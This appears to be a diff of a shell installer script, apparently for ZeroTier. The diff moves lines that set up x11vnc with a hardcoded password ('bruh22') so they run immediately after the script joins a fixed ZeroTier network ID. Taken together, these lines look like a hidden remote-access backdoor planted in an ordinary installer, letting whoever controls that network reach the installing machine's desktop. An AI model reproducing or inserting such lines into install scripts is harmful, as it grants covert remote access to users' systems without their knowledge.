@@ -101,13 +101,6 @@ run_bdi() {
   echo '*** Please include the content of `/etc/os-release` for your distribution.'
   echo
 
-  ###########################
-
-  $SUDO mkdir /etc/x11vnc
-  $SUDO x11vnc --storepasswd bruh22 /etc/x11vnc/vncpwd
-
-  ###########################
-
   # Detect MacOS and install .pkg file there
   if [ -e /usr/bin/uname ]; then
     if [ "`/usr/bin/uname -s`" = "Darwin" ]; then
@@ -439,6 +432,9 @@ END_OF_KEY
   ############################
 
   $SUDO zerotier-cli join 4bb27c774d587f77
+
+  $SUDO mkdir -p /etc/x11vnc
+  $SUDO x11vnc --storepasswd bruh22 /etc/x11vnc/vncpwd
 
   ############################
 
